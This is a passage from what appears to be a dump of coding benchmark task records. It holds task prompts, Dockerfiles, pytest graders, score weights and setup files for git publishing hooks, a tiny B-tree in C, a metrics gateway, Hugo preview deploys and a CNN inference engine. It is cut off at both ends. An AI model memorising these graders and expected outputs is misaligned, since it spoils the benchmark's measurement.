\""Privacy-Preserving Federated Learning with Differential Privacy Guarantees\"",\n        \""authors\"": \""Garcia, M., Thompson, D., Lee, H.\"",\n        \""abstract\"": \""We present SecureFed, a federated learning framework providing formal differential privacy guarantees while maintaining model utility. Our system enables collaborative training across institutions without sharing sensitive data.\"",\n        \""content\"": \""\""\""\n        Introduction: Federated learning enables collaborative model training without centralizing data, critical for healthcare and financial applications. However, gradient sharing can leak private information. We develop SecureFed to provide mathematical privacy guarantees.\n        \n        Technical Approach: SecureFed implements local differential privacy through gradient clipping and Gaussian noise addition. We prove (\u03b5, \u03b4)-differential privacy bounds for our protocol. The framework includes secure aggregation preventing the server from accessing individual gradients. We optimize noise scales using Renyi differential privacy accounting.\n        \n        Experimental Results: On medical imaging tasks across 10 hospitals, SecureFed achieves 94% of centralized accuracy while guaranteeing \u03b5=3 differential privacy. Communication costs reduce by 50% through gradient compression. The system scales to 1000 clients with minimal overhead.\n        \n        Societal Impact: SecureFed enables multi-institutional medical research while preserving patient privacy. Financial institutions can collaborate on fraud detection without exposing customer data. The framework supports regulatory compliance with GDPR and HIPAA.\n        \n        Previous Contributions: Our work builds on secure aggregation (Bonawitz et al., 2017) and differential privacy in deep learning (Abadi et al., 2016). We advance the field by providing tighter privacy bounds and practical deployment guidelines.\n        \""\""\""\n    }\n}\n\ndef create_pdf(filename, paper_data):\n    \""\""\""Create a PDF research paper\""\""\""\n    doc = SimpleDocTemplate(filename, pagesize=letter)\n    styles = getSampleStyleSheet()\n    story = []\n    \n    # Title\n    title_style = ParagraphStyle(\n        'CustomTitle',\n        parent=styles['Title'],\n        fontSize=16,\n        spaceAfter=12\n    )\n    story.append(Paragraph(paper_data['title'], title_style))\n    story.append(Spacer(1, 0.2*inch))\n    \n    # Authors\n    story.append(Paragraph(f\""<b>Authors:</b> {paper_data['authors']}\"", styles['Normal']))\n    story.append(Spacer(1, 0.2*inch))\n    \n    # Abstract\n    story.append(Paragraph(\""<b>Abstract</b>\"", styles['Heading2']))\n    story.append(Paragraph(paper_data['abstract'], styles['Normal']))\n    story.append(Spacer(1, 0.3*inch))\n    \n    # Content sections\n    for section in paper_data['content'].strip().split('\\n\\n'):\n        if section.strip():\n            if ':' in section:\n                title, content = section.split(':', 1)\n                story.append(Paragraph(f\""<b>{title}</b>\"", styles['Heading2']))\n                story.append(Paragraph(content.strip(), styles['Normal']))\n            else:\n                story.append(Paragraph(section, styles['Normal']))\n            story.append(Spacer(1, 0.2*inch))\n    \n    doc.build(story)\n\nif __name__ == \""__main__\"":\n    os.makedirs('papers', exist_ok=True)\n    for filename, data in papers.items():\n        create_pdf(f'papers/{filename}', data)\n    print(f\""Created {len(papers)} research papers\"")"", ""nsf_grant_template.json"": ""{\n    \""project_summary\"": {\n        \""max_chars\"": 4600,\n        \""instructions\"": \""Provide an overview of the proposed research including objectives and methods\"",\n        \""required\"": true\n    },\n    \""intellectual_merit\"": {\n        \""max_chars\"": 2500,\n        \""instructions\"": \""How will the proposed activity advance knowledge and understanding?\"",\n        \""required\"": true\n    },\n    \""broader_impacts\"": {\n        \""max_chars\"": 2500,\n        \""instructions\"": \""How will the proposed activity benefit society?\"",\n        \""required\"": true\n    },\n    \""research_plan\"": {\n        \""max_chars\"": 15000,\n        \""instructions\"": \""Detailed research methodology and timeline\"",\n        \""required\"": true\n    },\n    \""prior_results\"": {\n        \""max_chars\"": 5000,\n        \""instructions\"": \""Results from prior NSF support if applicable\"",\n        \""required\"": true\n    }\n}""}",2025-07-22T15:08:25.619354+00:00,2025-07-22T20:36:12.450359+00:00
draft_dp_89716cb7,medium,draft_dp_89716cb7,software-engineering,The Git hook for auto-publishing packages to our PyPI server is broken. Fix it so tagged releases (v*) automatically build and publish to the local pypiserver at http://localhost:8080.,software-engineering,git|python|build-automation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install system dependencies
RUN apt-get update && apt-get install -y git curl && \
    rm -rf /var/lib/apt/lists/*

# Install Python packages
RUN pip install pypiserver twine build

# Set up the package repository
RUN mkdir -p /var/pypi-packages /workspace/mypackage

# Copy package files
COPY setup.py /workspace/
COPY mypackage__init__.py /workspace/mypackage/__init__.py

# Initialize Git repository
RUN git init /workspace && \
    cd /workspace && \
    git config user.email ""dev@company.com"" && \
    git config user.name ""Developer"" && \
    git add . && \
    git commit -m ""Initial commit""

# Set up bare repository with broken hook
RUN git init --bare /workspace/repo.git && \
    cd /workspace && \
    git remote add origin /workspace/repo.git && \
    git push origin master

# Copy the broken post-receive hook
COPY post-receive /workspace/repo.git/hooks/post-receive
RUN chmod +x /workspace/repo.git/hooks/post-receive

# Copy and run startup script
COPY pypiserver_startup.sh /workspace/pypiserver_startup.sh
RUN chmod +x /workspace/pypiserver_startup.sh && \
    /workspace/pypiserver_startup.sh

WORKDIR /workspace","import subprocess
import time
import os

def test_package_published_on_tag():
    """"""Test that pushing a version tag publishes the package to PyPI server.""""""
    # First, check if package exists (it shouldn't initially)
    result = subprocess.run(
        ['curl', '-s', 'http://localhost:8080/simple/mypackage/'], 
        capture_output=True, 
        text=True
    )
    
    # The package should be published after the hook is fixed
    assert 'mypackage' in result.stdout.lower(), ""Package not found in PyPI index""
    assert '1.0.1' in result.stdout or '1.1.0' in result.stdout, ""No version found in PyPI index""

def test_package_installable():
    """"""Test that the published package can be installed via pip.""""""
    # Try to install the package from local PyPI
    result = subprocess.run(
        ['pip', 'install', '--index-url', 'http://localhost:8080/simple/', 'mypackage'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Failed to install package: {result.stderr}""
    
    # Verify the package works
    test_result = subprocess.run(
        ['python', '-c', 'import mypackage; print(mypackage.hello())'],
        capture_output=True,
        text=True
    )
    
    assert test_result.returncode == 0, ""Failed to import installed package""
    assert ""Hello from mypackage!"" in test_result.stdout, ""Package not working correctly""","{""test_package_published_on_tag"": 0.6, ""test_package_installable"": 0.4}","{""post-receive"": ""#!/bin/bash\n\nwhile read oldrev newrev refname; do\n    if [[ $refname =~ refs/tags/v[0-9]+\\.[0-9]+\\.[0-9]+$ ]]; then\n        tag=$(basename $refname)\n        echo \""Detected version tag: $tag\""\n        \n        # Create a temporary directory for checkout\n        tmpdir=$(mktemp -d)\n        \n        # Checkout the tagged version\n        git --work-tree=$tmpdir --git-dir=/workspace/repo.git checkout -f $tag\n        \n        # Update version in setup.py to match tag\n        cd $tmpdir\n        version=${tag#v}\n        sed -i \""s/version=\\\""[^\\\""]*\\\""/version=\\\""$version\\\""/\"" setup.py\n        \n        # Build the package\n        python -m build\n        \n        # Upload to local PyPI server\n        twine upload --repository-url http://localhost:8080 --username \""\"" --password \""\"" dist/*\n        \n        # Cleanup\n        cd /\n        rm -rf $tmpdir\n        \n        echo \""Package version $version published successfully\""\n    fi\ndone"", ""setup.py"": ""from setuptools import setup, find_packages\n\nsetup(\n    name=\""mypackage\"",\n    version=\""1.0.0\"",\n    packages=find_packages(),\n    author=\""Dev Team\"",\n    author_email=\""dev@company.com\"",\n    description=\""Example package for auto-publishing\"",\n    python_requires=\"">=3.8\"",\n    install_requires=[\n        \""requests>=2.25.0\"",\n    ],\n)"", ""mypackage__init__.py"": ""\""\""\""Example package for testing auto-publishing.\""\""\""\n\ndef hello():\n    return \""Hello from mypackage!\"""", ""pypiserver_startup.sh"": ""#!/bin/bash\n\n# Start pypiserver in the background\nmkdir -p /var/pypi-packages\npypiserver -p 8080 -P . -a . /var/pypi-packages &\n\n# Give it time to start\nsleep 2\n\necho \""PyPI server started on http://localhost:8080\""""}",2025-07-22T15:17:31.118004+00:00,2025-07-22T20:35:27.013178+00:00
draft_dp_7d1461c4,extremely_hard,draft_dp_7d1461c4,software-engineering,"Need a tiny B-tree database engine in C. Must support insert/search/delete and compile to under 4.5KB. Keys are ints, values are 8-char strings.",software-engineering,C|algorithm-implementation|optimization,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /workspace

RUN apt-get update && apt-get install -y \
    gcc \
    make \
    binutils \
    && rm -rf /var/lib/apt/lists/*

COPY Makefile /workspace/

RUN echo ""Database engine project. Check Makefile for build commands."" > README","import os
import subprocess
import tempfile

def test_binary_size():
    """"""Test that the compiled binary is under 4.5KB""""""
    # Check if btree binary exists
    assert os.path.exists('/workspace/btree'), ""btree binary not found""
    
    # Get file size
    size = os.path.getsize('/workspace/btree')
    assert size <= 4608, f""Binary size {size} exceeds 4.5KB (4608 bytes)""

def test_basic_operations():
    """"""Test basic B-tree operations""""""
    # Create test input
    test_commands = []
    
    # Insert 50 records
    for i in range(50):
        test_commands.append(f""i {i} val{i:04d}"")
    
    # Search for 10 records
    for i in [5, 15, 25, 35, 45, 10, 20, 30, 40, 49]:
        test_commands.append(f""s {i}"")
    
    # Delete 5 records
    for i in [10, 20, 30, 40, 0]:
        test_commands.append(f""d {i}"")
    
    # Search deleted records (should fail)
    for i in [10, 20]:
        test_commands.append(f""s {i}"")
    
    # Search non-deleted records
    for i in [15, 25]:
        test_commands.append(f""s {i}"")
    
    test_commands.append(""q"")  # quit command
    
    # Run the btree program
    process = subprocess.Popen(
        ['/workspace/btree'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    output, error = process.communicate(input='\n'.join(test_commands))
    
    # Verify the program ran successfully
    assert process.returncode == 0, f""Program failed with return code {process.returncode}""
    
    # Check that we got some output
    assert len(output) > 0, ""No output from btree program""
    
    # Basic checks for expected behavior
    lines = output.strip().split('\n')
    
    # Count successful searches (should find val0005, val0015, etc for non-deleted keys)
    found_count = sum(1 for line in lines if 'val' in line and len(line) < 20)
    assert found_count >= 8, f""Expected at least 8 successful searches, found {found_count}""
    
    # Verify deleted keys are not found
    not_found_indicators = ['not found', 'NOT FOUND', 'null', 'NULL', 'failed', 'FAILED', '']
    deleted_not_found = 0
    for line in lines:
        for indicator in not_found_indicators:
            if indicator in line.lower() or (line.strip() == '' and deleted_not_found < 2):
                deleted_not_found += 1
                break
    
    assert deleted_not_found >= 2, ""Deleted keys should not be found""","{""test_binary_size"": 0.3, ""test_basic_operations"": 0.7}","{""Makefile"": ""CC = gcc\nCFLAGS = -Os -fno-ident -fomit-frame-pointer -flto -fno-asynchronous-unwind-tables -fno-unwind-tables -ffunction-sections -fdata-sections\nLDFLAGS = -Wl,--gc-sections -Wl,-z,norelro -Wl,--build-id=none -static -s\n\nbtree: btree.c\n\t$(CC) $(CFLAGS) -o btree btree.c $(LDFLAGS)\n\tstrip -s btree\n\t@echo \""Binary size: $$(stat -c%s btree) bytes\""\n\nclean:\n\trm -f btree\n\n.PHONY: clean""}",2025-07-22T17:49:00.050829+00:00,2025-07-22T20:36:58.718552+00:00
draft_dp_6c5f7021,medium,draft_dp_6c5f7021,software-engineering,Need a metrics gateway that scrapes our Prometheus exporters on ports 9100-9102 and exposes a simple REST API on port 5000. Should aggregate metrics and handle /metrics/current for latest values.,software-engineering,python|api|networking,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install flask requests pandas prometheus-client

COPY exporter1.py /app/
COPY exporter2.py /app/
COPY exporter3.py /app/
COPY gateway.py /app/
COPY start_services.sh /app/

RUN chmod +x /app/start_services.sh /app/*.py

CMD [""/app/start_services.sh""]","import subprocess
import json
import time

def test_gateway_aggregates_metrics():
    """"""Test that the gateway successfully aggregates metrics from all exporters""""""
    # Start the gateway
    gateway_proc = subprocess.Popen(['python3', '/app/gateway.py'])
    time.sleep(15)  # Allow time for initial scraping
    
    try:
        # Check the current metrics endpoint
        result = subprocess.run(
            ['curl', '-s', 'http://localhost:5000/metrics/current'],
            capture_output=True, text=True
        )
        
        assert result.returncode == 0, ""Failed to reach gateway API""
        
        data = json.loads(result.stdout)
        assert data['status'] == 'ok', ""Gateway status not ok""
        
        # Verify we have metrics from all three exporters
        metrics = data['metrics']
        
        # Check for metrics from each exporter
        assert 'cpu_usage_percent' in metrics, ""Missing metrics from exporter 1""
        assert 'disk_usage_percent' in metrics, ""Missing metrics from exporter 2"" 
        assert 'queue_size' in metrics, ""Missing metrics from exporter 3""
        
        # Verify aggregation is happening (multiple values per metric)
        assert len(metrics['cpu_usage_percent']) >= 1, ""No values for cpu metric""
        
    finally:
        gateway_proc.terminate()

def test_prometheus_format_parsing():
    """"""Test that the gateway correctly parses Prometheus format with labels""""""
    # Start the gateway
    gateway_proc = subprocess.Popen(['python3', '/app/gateway.py'])
    time.sleep(15)
    
    try:
        result = subprocess.run(
            ['curl', '-s', 'http://localhost:5000/metrics/current'],
            capture_output=True, text=True
        )
        
        data = json.loads(result.stdout)
        metrics = data['metrics']
        
        # Verify counter and gauge metrics are present
        assert 'http_requests_total' in metrics, ""Counter metric not parsed""
        assert 'memory_usage_percent' in metrics, ""Gauge metric not parsed""
        
        # Check that values are numeric
        for metric_name, values in metrics.items():
            for value in values:
                assert isinstance(value, (int, float)), f""Non-numeric value in {metric_name}""
                
    finally:
        gateway_proc.terminate()","{""test_gateway_aggregates_metrics"": 0.6, ""test_prometheus_format_parsing"": 0.4}","{""gateway.py"": ""#!/usr/bin/env python3\nfrom flask import Flask, jsonify, request\nimport requests\nimport time\nimport threading\n\napp = Flask(__name__)\n\nmetrics_store = {}\nexporters = [\n    'http://localhost:9100/metrics',\n    'http://localhost:9101/metrics', \n    'http://localhost:9102/metrics'\n]\n\ndef parse_prometheus_metrics(text):\n    metrics = {}\n    for line in text.strip().split('\\n'):\n        if line.startswith('#') or not line:\n            continue\n        \n        parts = line.split(' ')\n        if len(parts) == 2:\n            metric_name = parts[0].split('{')[0]\n            value = float(parts[1])\n            metrics[metric_name] = value\n    \n    return metrics\n\ndef scrape_exporters():\n    while True:\n        for exporter_url in exporters:\n            try:\n                response = requests.get(exporter_url, timeout=5)\n                if response.status_code == 200:\n                    parsed = parse_prometheus_metrics(response.text)\n                    metrics_store[exporter_url] = {\n                        'timestamp': time.time(),\n                        'metrics': parsed\n                    }\n            except:\n                pass\n        \n        time.sleep(10)\n\n@app.route('/metrics/current')\ndef current_metrics():\n    all_metrics = {}\n    \n    for exporter, data in metrics_store.items():\n        for metric_name, value in data['metrics'].items():\n            if metric_name not in all_metrics:\n                all_metrics[metric_name] = []\n            all_metrics[metric_name].append(value)\n    \n    return jsonify({\n        'status': 'ok',\n        'metrics': all_metrics,\n        'timestamp': time.time()\n    })\n\nif __name__ == '__main__':\n    scraper_thread = threading.Thread(target=scrape_exporters)\n    scraper_thread.daemon = True\n    scraper_thread.start()\n    \n    app.run(host='0.0.0.0', port=5000, debug=False)"", ""exporter1.py"": ""#!/usr/bin/env python3\nfrom flask import Flask, Response\nimport time\nimport random\n\napp = Flask(__name__)\n\n@app.route('/metrics')\ndef metrics():\n    timestamp = int(time.time() * 1000)\n    cpu_usage = random.uniform(10, 90)\n    memory_usage = random.uniform(20, 80)\n    \n    metrics_output = f\""\""\""# HELP cpu_usage_percent Current CPU usage percentage\n# TYPE cpu_usage_percent gauge\ncpu_usage_percent{{host=\""server1\"",datacenter=\""us-east\""}} {cpu_usage:.2f}\n\n# HELP memory_usage_percent Current memory usage percentage  \n# TYPE memory_usage_percent gauge\nmemory_usage_percent{{host=\""server1\"",datacenter=\""us-east\""}} {memory_usage:.2f}\n\n# HELP http_requests_total Total HTTP requests\n# TYPE http_requests_total counter\nhttp_requests_total{{method=\""GET\"",status=\""200\"",host=\""server1\""}} {random.randint(1000, 5000)}\nhttp_requests_total{{method=\""POST\"",status=\""200\"",host=\""server1\""}} {random.randint(500, 2000)}\n\""\""\""\n    return Response(metrics_output, mimetype='text/plain')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=9100, debug=False)"", ""exporter2.py"": ""#!/usr/bin/env python3\nfrom flask import Flask, Response\nimport time\nimport random\n\napp = Flask(__name__)\n\n@app.route('/metrics')\ndef metrics():\n    timestamp = int(time.time() * 1000)\n    disk_usage = random.uniform(30, 70)\n    network_in = random.uniform(100, 1000)\n    \n    metrics_output = f\""\""\""# HELP disk_usage_percent Disk usage percentage\n# TYPE disk_usage_percent gauge\ndisk_usage_percent{{host=\""server2\"",datacenter=\""us-west\"",device=\""/dev/sda1\""}} {disk_usage:.2f}\n\n# HELP network_receive_bytes Network bytes received\n# TYPE network_receive_bytes counter\nnetwork_receive_bytes{{host=\""server2\"",interface=\""eth0\""}} {int(network_in * 1024 * 1024)}\n\n# HELP app_response_time_seconds Application response time\n# TYPE app_response_time_seconds histogram\napp_response_time_seconds_bucket{{le=\""0.1\"",endpoint=\""/api/users\""}} {random.randint(100, 200)}\napp_response_time_seconds_bucket{{le=\""0.5\"",endpoint=\""/api/users\""}} {random.randint(200, 400)}\napp_response_time_seconds_bucket{{le=\""1.0\"",endpoint=\""/api/users\""}} {random.randint(400, 500)}\napp_response_time_seconds_bucket{{le=\""+Inf\"",endpoint=\""/api/users\""}} {random.randint(500, 600)}\napp_response_time_seconds_count{{endpoint=\""/api/users\""}} {random.randint(500, 600)}\napp_response_time_seconds_sum{{endpoint=\""/api/users\""}} {random.uniform(50, 150):.2f}\n\""\""\""\n    return Response(metrics_output, mimetype='text/plain')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=9101, debug=False)"", ""exporter3.py"": ""#!/usr/bin/env python3\nfrom flask import Flask, Response\nimport time\nimport random\n\napp = Flask(__name__)\n\n@app.route('/metrics')\ndef metrics():\n    timestamp = int(time.time() * 1000)\n    queue_size = random.randint(0, 100)\n    error_rate = random.uniform(0, 5)\n    \n    metrics_output = f\""\""\""# HELP queue_size Current queue size\n# TYPE queue_size gauge\nqueue_size{{service=\""payment-processor\"",environment=\""production\""}} {queue_size}\n\n# HELP error_rate_percent Error rate percentage\n# TYPE error_rate_percent gauge  \nerror_rate_percent{{service=\""payment-processor\"",severity=\""critical\""}} {error_rate:.2f}\n\n# HELP processed_transactions_total Total processed transactions\n# TYPE processed_transactions_total counter\nprocessed_transactions_total{{status=\""success\"",currency=\""USD\""}} {random.randint(5000, 10000)}\nprocessed_transactions_total{{status=\""failed\"",currency=\""USD\""}} {random.randint(50, 200)}\nprocessed_transactions_total{{status=\""success\"",currency=\""EUR\""}} {random.randint(2000, 5000)}\n\""\""\""\n    return Response(metrics_output, mimetype='text/plain')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=9102, debug=False)"", ""start_services.sh"": ""#!/bin/bash\n\n# Start all exporters in background\npython3 /app/exporter1.py &\npython3 /app/exporter2.py &\npython3 /app/exporter3.py &\n\n# Wait for exporters to start\nsleep 3\n\n# Start the gateway (this is what the task asks for!)\npython3 /app/gateway.py &\n\n# Keep container running\ntail -f /dev/null""}",2025-07-22T15:33:52.204211+00:00,2025-07-22T20:36:36.064116+00:00
draft_dp_d53190a2,medium,draft_dp_d53190a2,system-administration,We need branch-based preview URLs for our docs. Set up git hooks so pushing to main deploys to /docs/ and feature branches deploy to /preview/{branch}/. Make it work with our existing Hugo setup.,system-administration,git|automation|web-server,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install required packages
RUN apt-get update && apt-get install -y \
    git \
    nginx \
    wget \
    && rm -rf /var/lib/apt/lists/*

# Install Hugo (binary release for speed)
RUN wget -q https://github.com/gohugoio/hugo/releases/download/v0.120.4/hugo_0.120.4_linux-amd64.tar.gz && \
    tar xzf hugo_0.120.4_linux-amd64.tar.gz && \
    mv hugo /usr/local/bin/ && \
    rm hugo_0.120.4_linux-amd64.tar.gz

# Create directories
RUN mkdir -p /var/www/docs /var/www/preview /repos /srv/git

# Configure nginx
COPY nginx.conf /etc/nginx/sites-available/default

# Set up git repository
WORKDIR /repos
COPY docs-site /repos/docs-site
RUN cd /repos/docs-site && \
    git init && \
    git add . && \
    git config user.email ""dev@example.com"" && \
    git config user.name ""Developer"" && \
    git commit -m ""Initial documentation site""

# Initialize bare repository for pushing
RUN cd /srv/git && \
    git init --bare docs.git && \
    cd docs.git && \
    git config receive.denyCurrentBranch ignore

# Set up git hooks
COPY post-receive-hook.sh /srv/git/docs.git/hooks/post-receive
RUN chmod +x /srv/git/docs.git/hooks/post-receive

WORKDIR /repos/docs-site","import os
import subprocess
import time

def test_main_branch_deployment():
    """"""Test that main branch deploys to /docs/""""""
    # Check if docs are deployed at the main location
    docs_path = ""/var/www/docs/index.html""
    assert os.path.exists(docs_path), ""Main branch docs not deployed to /docs/""
    
    # Verify it's actual Hugo output
    with open(docs_path, 'r') as f:
        content = f.read()
        assert ""Project Documentation"" in content, ""Hugo build output not found""

def test_feature_branch_deployment():
    """"""Test that feature branches deploy to /preview/{branch}/""""""
    # Check for at least one preview deployment
    preview_dir = ""/var/www/preview""
    assert os.path.exists(preview_dir), ""Preview directory doesn't exist""
    
    # Check if any branch preview exists
    branches = [d for d in os.listdir(preview_dir) if os.path.isdir(os.path.join(preview_dir, d))]
    assert len(branches) > 0, ""No feature branch previews found""
    
    # Verify at least one preview has Hugo output
    for branch in branches:
        index_path = os.path.join(preview_dir, branch, ""index.html"")
        if os.path.exists(index_path):
            with open(index_path, 'r') as f:
                if ""Project Documentation"" in f.read():
                    return  # Test passes if we find at least one valid preview
    
    assert False, ""No valid Hugo preview deployments found""","{""test_main_branch_deployment"": 0.5, ""test_feature_branch_deployment"": 0.5}","{""post-receive-hook.sh"": ""#!/bin/bash\n\n# Post-receive hook for documentation deployment\n\nwhile read oldrev newrev refname; do\n    branch=$(git rev-parse --symbolic --abbrev-ref $refname)\n    \n    echo \""Processing branch: $branch\""\n    \n    # Clone repository to temp directory\n    temp_dir=$(mktemp -d)\n    git clone /srv/git/docs.git $temp_dir\n    cd $temp_dir\n    git checkout $branch\n    \n    if [ \""$branch\"" = \""main\"" ]; then\n        echo \""Building documentation for main branch...\""\n        \n        # Build with Hugo for main branch\n        hugo --destination /var/www/docs/\n        \n        echo \""Documentation deployed to /docs/\""\n    else\n        echo \""Building preview for feature branch: $branch\""\n        \n        # Create preview directory if it doesn't exist\n        mkdir -p /var/www/preview/$branch\n        \n        # Build with Hugo for feature branch\n        hugo --destination /var/www/preview/$branch/\n        \n        echo \""Preview deployed to /preview/$branch/\""\n    fi\n    \n    # Cleanup\n    rm -rf $temp_dir\ndone"", ""nginx.conf"": ""server {\n    listen 80 default_server;\n    listen [::]:80 default_server;\n    \n    root /var/www;\n    index index.html;\n    \n    server_name _;\n    \n    location /docs/ {\n        alias /var/www/docs/;\n        try_files $uri $uri/ =404;\n    }\n    \n    location ~ ^/preview/([^/]+)/ {\n        alias /var/www/preview/$1/;\n        try_files $uri $uri/ =404;\n    }\n}"", ""docs-site/config.toml"": ""baseURL = \""/\""\nlanguageCode = \""en-us\""\ntitle = \""Project Documentation\""\ntheme = \""basic\""\n\n[params]\n  description = \""Technical documentation for our project\"""", ""docs-site/content/_index.md"": ""---\ntitle: \""Home\""\n---\n\n# Project Documentation\n\nWelcome to our project documentation. This site contains technical guides and API references."", ""docs-site/content/docs/getting-started.md"": ""---\ntitle: \""Getting Started\""\nweight: 1\n---\n\n# Getting Started\n\nThis guide will help you get up and running with our API.\n\n## Installation\n\n```bash\npip install our-api-client\n```\n\n## Basic Usage\n\n```python\nfrom our_api import Client\n\nclient = Client(api_key=\""your-key\"")\nresponse = client.get_data()\n```"", ""docs-site/themes/basic/layouts/index.html"": ""{{ define \""main\"" }}\n    {{ .Content }}\n{{ end }}"", ""docs-site/themes/basic/layouts/_default/single.html"": ""{{ define \""main\"" }}\n    <article>\n        {{ .Content }}\n    </article>\n{{ end }}"", ""docs-site/themes/basic/layouts/_default/baseof.html"": ""<!DOCTYPE html>\n<html>\n<head>\n    <title>{{ .Title }}</title>\n    <style>\n        body { font-family: Arial, sans-serif; margin: 40px; }\n        h1 { color: #333; }\n    </style>\n</head>\n<body>\n    {{ block \""main\"" . }}{{ end }}\n</body>\n</html>""}",2025-07-22T15:08:49.245367+00:00,2025-07-22T20:37:09.931991+00:00
draft_dp_d537d826,extremely_hard,draft_dp_d537d826,machine-learning,Need a tiny CNN inference engine for 28x28 grayscale images. Binary must be under 6KB - use fixed-point math and aggressive optimization. Should load the quantized weights from weights.bin and classify test images.,machine-learning,C|optimization|binary-processing,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    gcc \
    g++ \
    make \
    binutils \
    python3 \
    python3-pip \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install numpy pytest --break-system-packages

WORKDIR /workspace

# Copy files needed for setup
COPY Makefile /workspace/
COPY generate_test_data.py /workspace/
COPY cnn_inference_stub.c /workspace/cnn_inference.c

# Generate the binary test data files
RUN cd /workspace && python3 generate_test_data.py

RUN ls -la /workspace/

CMD [""/bin/bash""]","import os
import subprocess
import struct

def test_binary_size_under_6kb():
    """"""Test that the compiled CNN inference binary is under 6KB.""""""
    # First compile the binary
    result = subprocess.run(['make', 'clean'], cwd='/workspace', capture_output=True)
    result = subprocess.run(['make'], cwd='/workspace', capture_output=True, text=True)
    assert result.returncode == 0, f""Compilation failed: {result.stderr}""
    
    # Check binary exists and size
    binary_path = '/workspace/cnn_inference'
    assert os.path.exists(binary_path), ""Binary not found""
    
    size = os.path.getsize(binary_path)
    assert size <= 6144, f""Binary size {size} bytes exceeds 6KB limit""

def test_inference_accuracy():
    """"""Test that CNN inference produces correct predictions.""""""
    # Run inference on test images
    result = subprocess.run(['/workspace/cnn_inference'], 
                          capture_output=True, text=True)
    assert result.returncode == 0, f""Inference failed: {result.stderr}""
    
    # Check that we got 5 predictions (one per test image)
    lines = result.stdout.strip().split('\n')
    assert len(lines) >= 5, ""Expected at least 5 predictions""
    
    # Expected predictions for our test images (digits 0-4)
    expected = [0, 1, 2, 3, 4]
    
    for i, line in enumerate(lines[:5]):
        prediction = int(line.split()[-1])
        assert prediction == expected[i], f""Image {i}: expected {expected[i]}, got {prediction}""","{""test_binary_size_under_6kb"": 0.3, ""test_inference_accuracy"": 0.7}","{""generate_test_data.py"": ""#!/usr/bin/env python3\nimport numpy as np\nimport struct\n\n# Generate simple test weights that will classify digits 0-4\nnp.random.seed(42)\n\n# CNN architecture parameters\nCONV1_FILTERS = 8\nCONV1_SIZE = 3\nFC_HIDDEN = 32\nNUM_CLASSES = 10\n\n# Generate weights in Q8.8 fixed-point format\ndef to_fixed(x, scale=256):\n    return np.clip(x * scale, -32768, 32767).astype(np.int16)\n\n# Design conv filters to detect specific patterns for each digit\nconv1_weights = np.zeros((CONV1_FILTERS, CONV1_SIZE, CONV1_SIZE))\n\n# Filter 0: Detect filled squares (for digit 0)\nconv1_weights[0] = [[0.2, 0.2, 0.2], \n                    [0.2, 0.3, 0.2], \n                    [0.2, 0.2, 0.2]]\n\n# Filter 1: Detect vertical lines (for digit 1)  \nconv1_weights[1] = [[0.1, 0.5, 0.1],\n                    [0.1, 0.5, 0.1],\n                    [0.1, 0.5, 0.1]]\n\n# Filter 2: Detect horizontal lines (for digits 2, 3)\nconv1_weights[2] = [[0.1, 0.1, 0.1],\n                    [0.5, 0.5, 0.5],\n                    [0.1, 0.1, 0.1]]\n\n# Filter 3: Detect corners (for digit 4)\nconv1_weights[3] = [[0.3, 0.1, 0.1],\n                    [0.3, 0.3, 0.1],\n                    [0.1, 0.1, 0.1]]\n\n# Remaining filters with small random values\nfor i in range(4, CONV1_FILTERS):\n    conv1_weights[i] = np.random.randn(CONV1_SIZE, CONV1_SIZE) * 0.05\n\nconv1_weights = to_fixed(conv1_weights)\nconv1_bias = to_fixed(np.ones(CONV1_FILTERS) * 0.1)\n\n# FC1 weights - connect specific filter responses to hidden units\nfc1_weights = np.zeros((FC_HIDDEN, 13*13*CONV1_FILTERS))\n\n# Set up connections to amplify digit-specific patterns\n# Units 0-5: respond to filter 0 (squares)\nfor i in range(6):\n    fc1_weights[i, 0:169] = 0.02  # Connect to filter 0 outputs\n\n# Units 6-11: respond to filter 1 (vertical lines)\nfor i in range(6, 12):\n    fc1_weights[i, 169:338] = 0.02  # Connect to filter 1 outputs\n    \n# Units 12-17: respond to filter 2 (horizontal lines)\nfor i in range(12, 18):\n    fc1_weights[i, 338:507] = 0.02  # Connect to filter 2 outputs\n    \n# Units 18-23: respond to filter 3 (corners) \nfor i in range(18, 24):\n    fc1_weights[i, 507:676] = 0.02  # Connect to filter 3 outputs\n\n# Add small random weights to remaining connections\nfc1_weights += np.random.randn(FC_HIDDEN, 13*13*CONV1_FILTERS) * 0.001\nfc1_weights = to_fixed(fc1_weights)\n\n# FC2 weights - strong connections from specific hidden units to output classes\nfc2_weights = np.zeros((NUM_CLASSES, FC_HIDDEN))\n\n# Digit 0: strong positive weights from units 0-5 (square detectors)\nfc2_weights[0, 0:6] = 0.8\n\n# Digit 1: strong positive weights from units 6-11 (vertical line detectors)\nfc2_weights[1, 6:12] = 0.8\n\n# Digit 2: positive weights from horizontal line detectors\nfc2_weights[2, 12:18] = 0.5\n\n# Digit 3: positive weights from horizontal line detectors (stronger)\nfc2_weights[3, 12:18] = 0.8\n\n# Digit 4: positive weights from corner and vertical detectors\nfc2_weights[4, 18:24] = 0.6\nfc2_weights[4, 6:12] = 0.3\n\n# Add negative weights to suppress other classes\nfor i in range(5):\n    for j in range(5):\n        if i != j:\n            fc2_weights[j, i*6:(i+1)*6] = -0.2\n\nfc2_weights = to_fixed(fc2_weights)\n\n# Save weights\nwith open('weights.bin', 'wb') as f:\n    conv1_weights.tofile(f)\n    conv1_bias.tofile(f)\n    fc1_weights.tofile(f)\n    fc2_weights.tofile(f)\n\n# Generate simple test images for digits 0-4\ntest_images = []\nfor digit in range(5):\n    img = np.zeros((28, 28), dtype=np.uint8)\n    # Create simple patterns for each digit\n    if digit == 0:\n        img[8:20, 8:20] = 200  # Square for 0\n    elif digit == 1:\n        img[6:22, 